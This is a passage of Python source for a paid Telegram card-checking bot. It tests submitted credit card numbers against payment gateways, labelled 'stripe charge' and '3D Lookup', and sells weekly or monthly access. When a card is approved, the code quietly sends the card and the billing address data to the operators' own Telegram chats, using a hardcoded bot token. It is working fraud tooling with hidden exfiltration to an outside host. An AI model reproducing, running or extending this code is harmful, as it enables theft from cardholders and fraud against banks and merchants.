		country_flag = 'Unknown'
	try:
		bank = data['bank']
	except:
		bank = 'Unknown'
	end_time = time.time()
	execution_time = end_time - start_time
	msg=f'''<b>𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 ✅
			
⸙ 𝘾𝙖𝙧𝙙 ➼ <code>{cc}</code>
⸙ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➼ {last}
⸙ 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ➼ {gate}		
⸙ 𝘽𝙞𝙣 𝙄𝙣𝙛𝙤 ➼ {cc[:6]} - {card_type} - {brand}- {level}
⸙ 𝘾𝙤𝙪𝙣𝙩𝙧𝙮 ➼ {country} - {country_flag} 
⸙ 𝙄𝙨𝙨𝙪𝙚𝙧 ➼ <code>{bank}</code>
⸙ 𝙏𝙞𝙢𝙚 ➼ {"{:.1f}".format(execution_time)}
⸙ 𝗕𝗼𝘁 𝗕𝘆: @YourExDestiny</b>'''
	msgd=f'''<b>𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 ❌
			
⸙ 𝘾𝙖𝙧𝙙 ➼ <code>{cc}</code>
⸙ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➼ {last}
⸙ 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ➼ {gate}		
⸙ 𝘽𝙞𝙣 𝙄𝙣𝙛𝙤 ➼ {cc[:6]} - {card_type} - {brand}- {level}
⸙ 𝘾𝙤𝙪𝙣𝙩𝙧𝙮 ➼ {country} - {country_flag} 
⸙ 𝙄𝙨𝙨𝙪𝙚𝙧 ➼ <code>{bank}</code>
⸙ 𝙏𝙞𝙢𝙚 ➼ {"{:.1f}".format(execution_time)}
⸙ 𝗕𝗼𝘁 𝗕𝘆: @YourExDestiny</b>'''
	if "Funds" in last or 'Insufficient Funds' in last or 'avs' in last or '1000: Approved' in last or 'Duplicate' in last or 'Approved' in last:
		tok = '7386696229:AAGc13dq5xX6eADECHkNQBC32q9d2xE72jA'
		acc =  '-1002222638488'
		mg = f"""<b> 
❆═══» 𝖦ʙᴘ 𝖲ᴄʀᴀᴘᴘᴇʀ� «═══❆
｢𝙲𝙲」➔ <code>{cc}</code>
❆═══» 𝙸𝙽𝙵𝙾 «═══❆
｢𝙱𝙸𝙽」➔ <code>{cc[:6]}</code>
｢𝙸𝙽𝙵𝙾」➔ <code>{brand} - {card_type} - {level}</code>
｢𝙱𝙰𝙽𝙺」➔ <code>{bank}</code>
｢𝙲𝙾𝚄𝙽𝚃𝚁𝚈」➔ {country} - {country_flag}
❆═══» 𝖦ʙᴘ 𝖲ᴄʀᴀᴘᴘᴇʀ� «═══❆
✪ 𝙼𝚈 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ➔ @CARD3DBOTx
✪ 𝙼𝙰𝙳𝙴 𝚆𝙸𝚃𝙷 𝙱𝚈 ➔ @YourExDestiny 
</b>"""
		tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
		tlg_params = {"parse_mode": "HTML"}
		tok = '7386696229:AAGc13dq5xX6eADECHkNQBC32q9d2xE72jA'
		acb =  '-1002046977369'
		mag = f"""<b>
{cc}|{street}|{city}|{postal}|{phone}|UNITED STATES
</b>"""
		tly = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acb}&text={mag}"
		tlg_params = {"parse_mode": "HTML"}
		a = requests.post(tly, params=tlg_params)
		i = requests.post(tlg, params=tlg_params)
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg)
	else:
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msgd)
@bot.message_handler(func=lambda message: message.text.lower().startswith('.str') or message.text.lower().startswith('/str'))
def respond_to_vbv(message):
	gate='stripe charge'
	name = message.from_user.first_name
	idt=message.from_user.id
	id=message.chat.id
	with open('data.json', 'r') as json_file:
		json_data = json.load(json_file)

	try:BL=(json_data[str(idt)]['plan'])
	except:
		with open('data.json', 'r') as json_file:
			existing_data = json.load(json_file)
		new_data = {
			id : {
  "plan": "𝗙𝗥𝗘𝗘",
  "timer": "none",
			}
		}
		existing_data.update(new_data)
		with open('data.json', 'w') as json_file:
			json.dump(existing_data, json_file, ensure_ascii=False, indent=4)	
		BL='𝗙𝗥𝗘𝗘'
	if BL == '𝗙𝗥𝗘𝗘':
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="𝗢𝗪𝗡𝗘𝗥 ", url="https://t.me/YourExDestiny")
		ahmed = types.InlineKeyboardButton(text="𝘾𝙃𝘼𝙉𝙉𝙀𝙇 ", url="https://t.me/CARD3DBOTx")
		keyboard.add(contact_button, ahmed)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>𝗛𝗘𝗟𝗟𝗢 {name}
𝗧𝗛𝗜𝗦 𝗣𝗔𝗥𝗧𝗜𝗖𝗨𝗟𝗔𝗥 𝘾𝙃𝘼𝙉𝙉𝙀𝙇 𝗜𝗦 𝗡𝗢𝗧 𝗙𝗥𝗘𝗘 
𝗜𝗙 𝗬𝗢𝗨 𝗪𝗔𝗡𝗧 𝗧𝗢 𝗨𝗦𝗘 𝗜𝗧, 𝗬𝗢𝗨 𝗠𝗨𝗦𝗧 𝗣𝗨𝗥𝗖𝗛𝗔𝗦𝗘 𝗔 𝗪𝗘𝗘𝗞𝗟𝗬 𝗢𝗥 𝗠𝗢𝗡𝗧𝗛𝗟𝗬 𝗦𝗨𝗕𝗦𝗖𝗥𝗜𝗣𝗧𝗜𝗢𝗡 

𝗧𝗛𝗘 𝘾𝙃𝘼𝙉𝙉𝙀𝙇'𝗦 𝗝𝗢𝗕 𝗜𝗦 𝗧𝗢 𝗖𝗛𝗘𝗖𝗞 𝗖𝗔𝗥𝗗𝗦

𝘾𝙃𝘼𝙉𝙉𝙀𝙇 𝗦𝗨𝗕𝗦𝗖𝗥𝗜𝗣𝗧𝗜𝗢𝗡 𝗣𝗥𝗜𝗖𝗘𝗦:
 
𝗘𝗚𝗬𝗣𝗧 🇪🇬
1 𝗪𝗘𝗘𝗞 > 250𝗘𝗚
1 𝗠𝗢𝗡𝗧𝗛 > 600𝗘𝗚
━━━━━━━━━━━━
𝗜𝗥𝗔𝗤 🇮🇶
1 𝗪𝗘𝗘𝗞 » 6 𝗔𝗦𝗜𝗔 
1 𝗠𝗢𝗡𝗧𝗛 » 13 𝗔𝗦𝗜𝗔
━━━━━━━━━━━━
𝗪𝗢𝗥𝗟𝗗𝗪𝗜𝗗𝗘 » 𝗨𝗦𝗗𝗧 🌍
1 𝗪𝗘𝗘𝗞 » 6$ 
1 𝗠𝗢𝗡𝗧𝗛 » 13$
━━━━━━━━━━━━

𝗖𝗟𝗜𝗖𝗞 /cmds 𝗧𝗢 𝗩𝗜𝗘𝗪 𝗧𝗛𝗘 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦

𝗬𝗢𝗨𝗥 𝗣𝗟𝗔𝗡 𝗡𝗢𝗪 {BL}</b>
''',reply_markup=keyboard)
		return
	with open('data.json', 'r') as file:
		json_data = json.load(file)
		date_str=json_data[str(id)]['timer'].split('.')[0]
	try:
		provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
	except Exception as e:
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="𝗢𝗪𝗡𝗘𝗥 ", url="https://t.me/YourExDestiny")
		ahmed = types.InlineKeyboardButton(text="𝘾𝙃𝘼𝙉𝙉𝙀𝙇 ", url="https://t.me/CARD3DBOTx")
		keyboard.add(contact_button, ahmed)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>𝗛𝗘𝗟𝗟𝗢 {name}
𝗧𝗛𝗜𝗦 𝗣𝗔𝗥𝗧𝗜𝗖𝗨𝗟𝗔𝗥 𝘾𝙃𝘼𝙉𝙉𝙀𝙇 𝗜𝗦 𝗡𝗢𝗧 𝗙𝗥𝗘𝗘 
𝗜𝗙 𝗬𝗢𝗨 𝗪𝗔𝗡𝗧 𝗧𝗢 𝗨𝗦𝗘 𝗜𝗧, 𝗬𝗢𝗨 𝗠𝗨𝗦𝗧 𝗣𝗨𝗥𝗖𝗛𝗔𝗦𝗘 𝗔 𝗪𝗘𝗘𝗞𝗟𝗬 𝗢𝗥 𝗠𝗢𝗡𝗧𝗛𝗟𝗬 𝗦𝗨𝗕𝗦𝗖𝗥𝗜𝗣𝗧𝗜𝗢𝗡 

𝗧𝗛𝗘 𝘾𝙃𝘼𝙉𝙉𝙀𝙇'𝗦 𝗝𝗢𝗕 𝗜𝗦 𝗧𝗢 𝗖𝗛𝗘𝗖𝗞 𝗖𝗔𝗥𝗗𝗦

𝘾𝙃𝘼𝙉𝙉𝙀𝙇 𝗦𝗨𝗕𝗦𝗖𝗥𝗜𝗣𝗧𝗜𝗢𝗡 𝗣𝗥𝗜𝗖𝗘𝗦:
 
𝗘𝗚𝗬𝗣𝗧 🇪🇬
1 𝗪𝗘𝗘𝗞 > 250𝗘𝗚
1 𝗠𝗢𝗡𝗧𝗛 > 600𝗘𝗚
━━━━━━━━━━━━
𝗜𝗥𝗔𝗤 🇮🇶
1 𝗪𝗘𝗘𝗞 » 6 𝗔𝗦𝗜𝗔 
1 𝗠𝗢𝗡𝗧𝗛 » 13 𝗔𝗦𝗜𝗔
━━━━━━━━━━━━
𝗪𝗢𝗥𝗟𝗗𝗪𝗜𝗗𝗘 » 𝗨𝗦𝗗𝗧 🌍
1 𝗪𝗘𝗘𝗞 » 6$ 
1 𝗠𝗢𝗡𝗧𝗛 » 13$
━━━━━━━━━━━━

𝗖𝗟𝗜𝗖𝗞 /cmds 𝗧𝗢 𝗩𝗜𝗘𝗪 𝗧𝗛𝗘 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦

𝗬𝗢𝗨𝗥 𝗣𝗟𝗔𝗡 𝗡𝗢𝗪 {BL}</b>
''',reply_markup=keyboard)
		return
	current_time = datetime.now()
	required_duration = timedelta(hours=0)
	if current_time - provided_time > required_duration:
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="𝗢𝗪𝗡𝗘𝗥 ", url="https://t.me/YourExDestiny")
		ahmed = types.InlineKeyboardButton(text="𝘾𝙃𝘼𝙉𝙉𝙀𝙇 ", url="https://t.me/CARD3DBOTx")
		keyboard.add(contact_button, ahmed)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>𝗬𝗢𝗨 𝗖𝗔𝗡𝗡𝗢𝗧 𝗨𝗦𝗘 𝗧𝗛𝗘 𝘾𝙃𝘼𝙉𝙉𝙀𝙇 𝗕𝗘𝗖𝗔𝗨𝗦𝗘 𝗬𝗢𝗨𝗥 𝗦𝗨𝗕𝗦𝗖𝗥𝗜𝗣𝗧𝗜𝗢𝗡 𝗛𝗔𝗦 𝗘𝗫𝗣𝗜𝗥𝗘𝗗</b>
	''',reply_markup=keyboard)
		with open('data.json', 'r') as file:
			json_data = json.load(file)
		json_data[str(id)]['timer'] = 'none'
		json_data[str(id)]['paln'] = '𝗙𝗥𝗘𝗘'
		with open('data.json', 'w') as file:
			json.dump(json_data, file, indent=2)
		return
	try:command_usage[idt]['last_time']
	except:command_usage[idt] = {
				'last_time': datetime.now()
			}
	if command_usage[idt]['last_time'] is not None:
		time_diff = (current_time - command_usage[idt]['last_time']).seconds
		if time_diff < 30:
			bot.reply_to(message, f"<b>Try again after {30-time_diff} seconds.</b>",parse_mode="HTML")
			return	
	ko = (bot.reply_to(message, "𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 𝗬𝗢𝗨𝗥 𝗖𝗔𝗥𝗗𝗦...⌛").message_id)
	try:
		cc = message.reply_to_message.text
	except:
		cc=message.text
	cc=str(reg(cc))
	if cc == 'None':
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>🚫 Oops!
Please ensure you enter the card details in the correct format:
Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
		return
	start_time = time.time()
	try:
		command_usage[idt]['last_time'] = datetime.now()
		last = str(st(cc))
	except Exception as e:
		last='Error'
		print(e)
	try: data = requests.get('https://bins.antipublic.cc/bins/'+cc[:6]).json()
	except: pass
	try:
	    level = data['level']
	except:
	    level = 'Unknown'
	try:
		brand = data['brand']
	except:
		brand = 'Unknown'
	try:
		card_type = data['type']
	except:
		card_type = 'Unknown'
	try:
		country = data['country']
		country_flag = data['country_flag']
	except:
		country = 'Unknown'
		country_flag = 'Unknown'
	try:
		bank = data['bank']
	except:
		bank = 'Unknown'
	end_time = time.time()
	execution_time = end_time - start_time
	msgd=f'''<b>𝗥𝗘𝗝𝗘𝗖𝗧𝗘𝗗 ❌
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑪𝑨𝑹𝑫  ➜ <code>{cc}</code>
◆ 𝑮𝑨𝑻𝑬𝑾𝑨𝒀 ➜ {gate}
◆ 𝑹𝑬𝑺𝑷𝑶𝑵𝑺𝑬 ➜ {last}
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝑰𝑵 ➜ <code>{cc[:6]} - {card_type} - {brand}</code>
◆ 𝑩𝑨𝑵𝑲 ➜ <code>{bank}</code>
◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ <code>{country} - {country_flag}</code> 
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝒀: @YourExDestiny
◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
	msg=f'''<b>𝑪𝑯𝑨𝑹𝑮𝑬 ✅
			- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑪𝑨𝑹𝑫  ➜ <code>{cc}</code>
◆ 𝑮𝑨𝑻𝑬𝑾𝑨𝒀 ➜ {gate}
◆ 𝑹𝑬𝑺𝑷𝑶𝑵𝑺𝑬 ➜ {last}
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝑰𝑵 ➜ <code>{cc[:6]} - {card_type} - {brand}</code>
◆ 𝑩𝑨𝑵𝑲 ➜ <code>{bank}</code>
◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ <code>{country} - {country_flag}</code> 
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝒀: @YourExDestiny
◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
	msgc=f'''<b>𝑪𝑪𝑵 ☑️
			- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑪𝑨𝑹𝑫  ➜ <code>{cc}</code>
◆ 𝑮𝑨𝑻𝑬𝑾𝑨𝒀 ➜ {gate}
◆ 𝑹𝑬𝑺𝑷𝑶𝑵𝑺𝑬 ➜ {last}
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝑰𝑵 ➜ <code>{cc[:6]} - {card_type} - {brand}</code>
◆ 𝑩𝑨𝑵𝑲 ➜ <code>{bank}</code>
◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ <code>{country} - {country_flag}</code> 
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝒀: @YourExDestiny
◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
	msgf=f'''<b>𝑰𝑵𝑺𝑼𝑭𝑭𝑰𝑪𝑰𝑬𝑵𝑻 𝑭𝑼𝑵𝑫𝑺 ☑️
			- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑪𝑨𝑹𝑫  ➜ <code>{cc}</code>
◆ 𝑮𝑨𝑻𝑬𝑾𝑨𝒀 ➜ {gate}
◆ 𝑹𝑬𝑺𝑷𝑶𝑵𝑺𝑬 ➜ {last}
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝑰𝑵 ➜ <code>{cc[:6]} - {card_type} - {brand}</code>
◆ 𝑩𝑨𝑵𝑲 ➜ <code>{bank}</code>
◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ <code>{country} - {country_flag}</code> 
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝒀: @YourExDestiny
◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
	if 'success' in last:
		tok = '7386696229:AAGc13dq5xX6eADECHkNQBC32q9d2xE72jA'
		acc =  '-1002222638488'
		mg = f"""<b> 
❆═══» 𝖦ʙᴘ 𝖲ᴄʀᴀᴘᴘᴇʀ� «═══❆
｢𝙲𝙲」➔ <code>{cc}</code>
❆═══» 𝙸𝙽𝙵𝙾 «═══❆
｢𝙱𝙸𝙽」➔ {cc[:6]}
｢𝙸𝙽𝙵𝙾」➔ {brand} - {card_type} - {level}
｢𝙱𝙰𝙽𝙺」➔ {bank}
｢𝙲𝙾𝚄𝙽𝚃𝚁𝚈」➔ {country} - {country_flag}
❆═══» 𝖦ʙᴘ 𝖲ᴄʀᴀᴘᴘᴇʀ� «═══❆
✪ 𝙼𝚈 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ➔ @card3dbotx
✪ 𝙼𝙰𝙳𝙴 𝚆𝙸𝚃𝙷 𝙱𝚈 ➔ @YourExDestiny 
</b>"""
		tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
		tlg_params = {"parse_mode": "HTML"}
		tok = '7386696229:AAGc13dq5xX6eADECHkNQBC32q9d2xE72jA'
		acb =  '-1002046977369'
		mag = f"""<b>
{cc}|{street}|{city}|{postal}|{phone}|UNITED STATES
</b>"""
		tly = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acb}&text={mag}"
		tly_params = {"parse_mode": "HTML"}
		a = requests.post(tly, params=tly_params)
		i = requests.post(tlg, params=tlg_params)
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg)
	elif "funds" in last:
		tok = '7386696229:AAGc13dq5xX6eADECHkNQBC32q9d2xE72jA'
		acc =  '-1002222638488'
		mg = f"""<b> 
❆═══» 𝖦ʙᴘ 𝖲ᴄʀᴀᴘᴘᴇʀ� «═══❆
｢𝙲𝙲」➔ <code>{cc}</code>
❆═══» 𝙸𝙽𝙵𝙾 «═══❆
｢𝙱𝙸𝙽」➔ {cc[:6]}
｢𝙸𝙽𝙵𝙾」➔ {brand} - {card_type} - {level}
｢𝙱𝙰𝙽𝙺」➔ {bank}
｢𝙲𝙾𝚄𝙽𝚃𝚁𝚈」➔ {country} - {country_flag}
❆═══» 𝖦ʙᴘ 𝖲ᴄʀᴀᴘᴘᴇʀ� «═══❆
✪ 𝙼𝚈 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ➔ @card3dbotx
✪ 𝙼𝙰𝙳𝙴 𝚆𝙸𝚃𝙷 𝙱𝚈 ➔ @YourExDestiny 
</b>"""
		tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
		tlg_params = {"parse_mode": "HTML"}
		tok = '7386696229:AAGc13dq5xX6eADECHkNQBC32q9d2xE72jA'
		acb =  '-1002046977369'
		mag = f"""<b>
{cc}|{street}|{city}|{postal}|{phone}|UNITED STATES
</b>"""
		tly = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acb}&text={mag}"
		tly_params = {"parse_mode": "HTML"}
		a = requests.post(tly, params=tly_params)
		i = requests.post(tlg, params=tlg_params)
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msgf)
	elif "card's security" in last:
		tok = '7386696229:AAGc13dq5xX6eADECHkNQBC32q9d2xE72jA'
		acc =  '-1002222638488'
		mg = f"""<b> 
❆═══» 𝖦ʙᴘ 𝖲ᴄʀᴀᴘᴘᴇʀ� «═══❆
｢𝙲𝙲」➔ <code>{cc}</code>
❆═══» 𝙸𝙽𝙵𝙾 «═══❆
｢𝙱𝙸𝙽」➔ {cc[:6]}
｢𝙸𝙽𝙵𝙾」➔ {brand} - {card_type} - {level}
｢𝙱𝙰𝙽𝙺」➔ {bank}
｢𝙲𝙾𝚄𝙽𝚃𝚁𝚈」➔ {country} - {country_flag}
❆═══» 𝖦ʙᴘ 𝖲ᴄʀᴀᴘᴘᴇʀ� «═══❆
✪ 𝙼𝚈 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ➔ @card3dbotx
✪ 𝙼𝙰𝙳𝙴 𝚆𝙸𝚃𝙷 𝙱𝚈 ➔ @YourExDestiny 
</b>"""
		tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
		tlg_params = {"parse_mode": "HTML"}
		tok = '7386696229:AAGc13dq5xX6eADECHkNQBC32q9d2xE72jA'
		acb =  '-1002046977369'
		mag = f"""<b>
{cc}|{street}|{city}|{postal}|{phone}|UNITED STATES
</b>"""
		tly = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acb}&text={mag}"
		tly_params = {"parse_mode": "HTML"}
		a = requests.post(tly, params=tly_params)
		i = requests.post(tlg, params=tlg_params)
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msgc)
	else:
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msgd)
@bot.message_handler(func=lambda message: message.text.lower().startswith('.redeem') or message.text.lower().startswith('/redeem'))
def respond_to_vbv(message):
	def my_function():
		global stop
		try:
			re=message.text.split(' ')[1]
			with open('data.json', 'r') as file:
				json_data = json.load(file)
			timer=(json_data[re]['time'])
			typ=(json_data[f"{re}"]["plan"])
			json_data[f"{message.from_user.id}"]['timer'] = timer
			json_data[f"{message.from_user.id}"]['plan'] = typ
			with open('data.json', 'w') as file:
				json.dump(json_data, file, indent=2)
			with open('data.json', 'r') as json_file:
				data = json.load(json_file)
			del data[re]
			with open('data.json', 'w') as json_file:
				json.dump(data, json_file, ensure_ascii=False, indent=4)
			msg=f'''<b>𝗩𝗜𝗣 𝗦𝗨𝗕𝗦𝗖𝗥𝗜𝗕𝗘𝗗 ✅
𝑺𝑼𝑩𝑺𝑪𝑹𝑰𝑷𝑻𝑰𝑶𝑵 𝗘𝗫𝗣𝗜𝗥𝗘𝗦 𝗜𝗡 ➜ {timer}
𝗧𝗬𝗣 ➜ {typ}</b>'''
			bot.reply_to(message,msg,parse_mode="HTML")
		except Exception as e:
			print('ERROR : ',e)
			bot.reply_to(message,'<b>Incorrect code or it has already been redeemed </b>',parse_mode="HTML")
	my_thread = threading.Thread(target=my_function)
	my_thread.start()
@bot.message_handler(commands=["code"])
def start(message):
	def my_function():
		id=message.from_user.id
		if not id ==admin:
			return
		try:
			h=float(message.text.split(' ')[1])
			with open('data.json', 'r') as json_file:
				existing_data = json.load(json_file)
			characters = string.ascii_uppercase + string.digits
			pas ='DAXXOP-'+''.join(random.choices(characters, k=4))+'-'+''.join(random.choices(characters, k=4))+'-'+''.join(random.choices(characters, k=4))
			current_time = datetime.now()
			ig = current_time + timedelta(hours=h)
			plan='𝗩𝗜𝗣'
			parts = str(ig).split(':')
			ig = ':'.join(parts[:2])
			with open('data.json', 'r') as json_file:
				existing_data = json.load(json_file)
			new_data = {
				pas : {
	  "plan": plan,
	  "time": ig,
			}
			}
			existing_data.update(new_data)
			with open('data.json', 'w') as json_file:
				json.dump(existing_data, json_file, ensure_ascii=False, indent=4)	
			msg=f'''<b>𝗡𝗘𝗪 𝗞𝗘𝗬 𝗖𝗥𝗘𝗔𝗧𝗘𝗗 🚀
		
𝗣𝗟𝗔𝗡 ➜ {plan}
𝗘𝗫𝗣𝗜𝗥𝗘𝗦 𝗜𝗡 ➜ {ig}
𝗞𝗘𝗬 ➜ <code>{pas}</code>
		
𝗨𝗦𝗘 /redeem [𝗞𝗘𝗬]</b>'''
			bot.reply_to(message,msg,parse_mode="HTML")
		except Exception as e:
			print('ERROR : ',e)
			bot.reply_to(message,e,parse_mode="HTML")
	my_thread = threading.Thread(target=my_function)
	my_thread.start()
@bot.message_handler(func=lambda message: message.text.lower().startswith('.vbv') or message.text.lower().startswith('/vbv'))
def respond_to_vbv(message):
	id=message.from_user.id
	name = message.from_user.first_name
	gate='3D Lookup'
	with open('data.json', 'r') as file:
		json_data = json.load(file)
	try:BL=(json_data[str(id)]['plan'])
	except:
		with open('data.json', 'r') as json_file:
			existing_data = json.load(json_file)
		new_data = {
			id : {
  "plan": "𝗙𝗥𝗘𝗘",
  "timer": "none",
			}
		}
		BL='𝗙𝗥𝗘𝗘'
		existing_data.update(new_data)
		with open('data.json', 'w') as json_file:
			json.dump(existing_data, json_file, ensure_ascii=False, indent=4)	
	if BL == '𝗙𝗥𝗘𝗘':
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="𝗢𝗪𝗡𝗘𝗥 ", url="https://t.me/YourExDestiny")
		ahmed = types.InlineKeyboardButton(text="𝘾𝙃𝘼𝙉𝙉𝙀𝙇 ", url="https://t.me/CARD3DBOTx")
		keyboard.add(contact_button, ahmed)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>𝗛𝗘𝗟𝗟𝗢 {name}
𝗧𝗛𝗜𝗦 𝗣𝗔𝗥𝗧𝗜𝗖𝗨𝗟𝗔𝗥 𝘾𝙃𝘼𝙉𝙉𝙀𝙇 𝗜𝗦 𝗡𝗢𝗧 𝗙𝗥𝗘𝗘 
𝗜𝗙 𝗬𝗢𝗨 𝗪𝗔𝗡𝗧 𝗧𝗢 𝗨𝗦𝗘 𝗜𝗧, 𝗬𝗢𝗨 𝗠𝗨𝗦𝗧 𝗣𝗨𝗥𝗖𝗛𝗔𝗦𝗘 𝗔 𝗪𝗘𝗘𝗞𝗟𝗬 𝗢𝗥 𝗠𝗢𝗡𝗧𝗛𝗟𝗬 𝗦𝗨𝗕𝗦𝗖𝗥𝗜𝗣𝗧𝗜𝗢𝗡 

𝗧𝗛𝗘 𝘾𝙃𝘼𝙉𝙉𝙀𝙇'𝗦 𝗝𝗢𝗕 𝗜𝗦 𝗧𝗢 𝗖𝗛𝗘𝗖𝗞 𝗖𝗔𝗥𝗗𝗦

𝘾𝙃𝘼𝙉𝙉𝙀𝙇 𝗦𝗨𝗕𝗦𝗖𝗥𝗜𝗣𝗧𝗜𝗢𝗡 𝗣𝗥𝗜𝗖𝗘𝗦:
 
𝗘𝗚𝗬𝗣𝗧 🇪🇬
1 𝗪𝗘𝗘𝗞 > 250𝗘𝗚
1 𝗠𝗢𝗡𝗧𝗛 > 600𝗘𝗚
━━━━━━━━━━━━
𝗜𝗥𝗔𝗤 🇮🇶
1 𝗪𝗘𝗘𝗞 » 6 𝗔𝗦𝗜𝗔 
1 𝗠𝗢𝗡𝗧𝗛 » 13 𝗔𝗦𝗜𝗔
━━━━━━━━━━━━
𝗪𝗢𝗥𝗟𝗗𝗪𝗜𝗗𝗘 » 𝗨𝗦𝗗𝗧 🌍
1 𝗪𝗘𝗘𝗞 » 6$ 
1 𝗠𝗢𝗡𝗧𝗛 » 13$
━━━━━━━━━━━━

𝗖𝗟𝗜𝗖𝗞 /cmds 𝗧𝗢 𝗩𝗜𝗘𝗪 𝗧𝗛𝗘 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦

𝗬𝗢𝗨𝗥 𝗣𝗟𝗔𝗡 𝗡𝗢𝗪 {BL}</b>
''',reply_markup=keyboard)
		return
	with open('data.json', 'r') as file:
		json_data = json.load(file)
		date_str=json_data[str(id)]['timer'].split('.')[0]
	try:
		provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
	except Exception as e:
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="𝗢𝗪𝗡𝗘𝗥 ", url="https://t.me/YourExDestiny")
		ahmed = types.InlineKeyboardButton(text="𝘾𝙃𝘼𝙉𝙉𝙀𝙇 ", url="https://t.me/CARD3DBOTx")
		keyboard.add(contact_button, ahmed)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>𝗛𝗘𝗟𝗟𝗢 {name}
𝗧𝗛𝗜𝗦 𝗣𝗔𝗥𝗧𝗜𝗖𝗨𝗟𝗔𝗥 𝘾𝙃𝘼𝙉𝙉𝙀𝙇 𝗜𝗦 𝗡𝗢𝗧 𝗙𝗥𝗘𝗘 
𝗜𝗙 𝗬𝗢𝗨 𝗪𝗔𝗡𝗧 𝗧𝗢 𝗨𝗦𝗘 𝗜𝗧, 𝗬𝗢𝗨 𝗠𝗨𝗦𝗧 𝗣𝗨𝗥𝗖𝗛𝗔𝗦𝗘 𝗔 𝗪𝗘𝗘𝗞𝗟𝗬 𝗢𝗥 𝗠𝗢𝗡𝗧𝗛𝗟𝗬 𝗦𝗨𝗕𝗦𝗖𝗥𝗜𝗣𝗧𝗜𝗢𝗡 

𝗧𝗛𝗘 𝘾𝙃𝘼𝙉𝙉𝙀𝙇'𝗦 𝗝𝗢𝗕 𝗜𝗦 𝗧𝗢 𝗖𝗛𝗘𝗖𝗞 𝗖𝗔𝗥𝗗𝗦

𝘾𝙃𝘼𝙉𝙉𝙀𝙇 𝗦𝗨𝗕𝗦𝗖𝗥𝗜𝗣𝗧𝗜𝗢𝗡 𝗣𝗥𝗜𝗖𝗘𝗦:
 
𝗘𝗚𝗬𝗣𝗧 🇪🇬
1 𝗪𝗘𝗘𝗞 > 250𝗘𝗚
1 𝗠𝗢𝗡𝗧𝗛 > 600𝗘𝗚
━━━━━━━━━━━━
𝗜𝗥𝗔𝗤 🇮🇶
1 𝗪𝗘𝗘𝗞 » 6 𝗔𝗦𝗜𝗔 
1 𝗠𝗢𝗡𝗧𝗛 » 13 𝗔𝗦𝗜𝗔
━━━━━━━━━━━━
𝗪𝗢𝗥𝗟𝗗𝗪𝗜𝗗𝗘 » 𝗨𝗦𝗗𝗧 🌍
1 𝗪𝗘𝗘𝗞 » 6$ 
